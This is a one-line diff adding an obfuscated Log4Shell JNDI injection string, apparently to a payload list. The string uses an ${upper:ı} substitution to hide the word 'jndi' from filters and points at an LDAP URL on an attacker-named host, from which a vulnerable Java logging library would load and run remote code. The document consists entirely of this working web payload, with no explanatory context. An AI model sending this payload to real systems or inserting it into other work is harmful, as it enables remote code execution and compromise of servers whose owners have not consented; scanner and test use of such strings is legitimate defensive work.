@@ -1,0 +1,1 @@
+${jnd${upper:ı}:ldap://somesitehackerofhell.com/z}
